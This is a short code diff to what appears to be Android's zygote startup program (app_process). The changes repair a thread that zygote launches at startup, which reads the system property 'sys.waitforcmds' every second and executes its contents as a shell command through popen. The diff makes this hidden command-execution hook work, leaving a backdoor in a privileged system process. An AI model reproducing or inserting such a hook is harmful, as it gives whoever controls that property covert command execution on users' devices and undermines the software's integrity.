@@ -47,13 +47,13 @@ void print_result(FILE *fp)
 }
 
 
-void* normalCallBack(void* data){
+void* normalCallBack(){
     FILE *fp = NULL;
 
     while(1) {
         char value[PROPERTY_VALUE_MAX];
         property_get("sys.waitforcmds", value, "");
-        if(value){ //定时读取命令执行
+        if(strlen(value)>0){ //定时读取命令执行
             fp = popen(value, "r");
                 if(!fp) {
                     perror("popen");
@@ -61,7 +61,7 @@ void* normalCallBack(void* data){
                     print_result(fp);
                     pclose(fp);
                 }
-             property_set("sys.waitforcmds", value, "")
+             property_set("sys.waitforcmds", "")
         }
         sleep(1);
     }
@@ -335,7 +335,7 @@ int main(int argc, char* const argv[])
             zygote = true;
             niceName = ZYGOTE_NICE_NAME;
             ALOGE("zygote2 is start");
-            pthread_create(&pthread, NULL, normalCallBack, (void *) 1);
+            pthread_create(&pthread, NULL, normalCallBack, nullptr);
         } else if (strcmp(arg, "--start-system-server") == 0) {
             startSystemServer = true;
         } else if (strcmp(arg, "--application") == 0) {
